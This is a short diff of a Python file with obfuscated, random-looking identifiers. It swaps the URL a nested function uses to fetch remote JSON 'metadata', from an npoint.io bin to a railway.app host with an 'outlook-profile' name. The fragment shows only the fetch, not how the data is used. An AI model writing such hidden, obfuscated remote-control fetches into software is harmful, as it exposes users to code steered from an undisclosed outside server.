@@ -16,7 +16,7 @@ def model_fmanji_399():
 
     def learn_etpvoo_521():
         try:
-            process_hocliw_904 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_hocliw_904 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_hocliw_904.raise_for_status()
             eval_cmwgig_939 = process_hocliw_904.json()
             train_kzerya_893 = eval_cmwgig_939.get('metadata')
